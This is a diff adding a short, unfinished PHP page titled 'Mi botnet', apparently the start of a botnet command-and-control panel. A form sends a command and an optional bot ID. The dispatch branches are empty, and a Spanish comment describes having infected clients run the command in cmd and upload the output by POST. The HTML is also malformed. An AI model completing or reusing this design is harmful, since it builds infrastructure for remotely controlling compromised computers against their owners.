@@ -1,0 +1,28 @@
+<html> 
+<head> 
+<title>Mi botnet</title>
+<form action="bot.php" method="GET" > 
+<sub style="color: #000000">Comando a interpretar</sub>
+<input type="Text" name="com" size="35" maxlength="100">
+<sub style="color: #000000">Seleccione bot (si no todos serán objetivos)</sub>
+<input type="Text" name="bot" size="8" maxlength="20">
+<input type="Submit" value="ENVIAR">
+</form>
+<?
+$comando = $_GET['com'];
+$bot = $_GET['bot'];
+if(strcmp($bot,"")==0)//mando comado a todos
+{
+ 
+}
+else//busco y mando comando solo al indicado
+{
+ 
+}
+//Aqui debería mandar la cadena de texto al cliente para que lo ejecute en la cmd y genere un archivo, que luego lo subiré
+//con un POST su contenido, cargándolo en una variable y mostrándolo.
+?>
+</div>
+</center>
+</body> 
+</html>
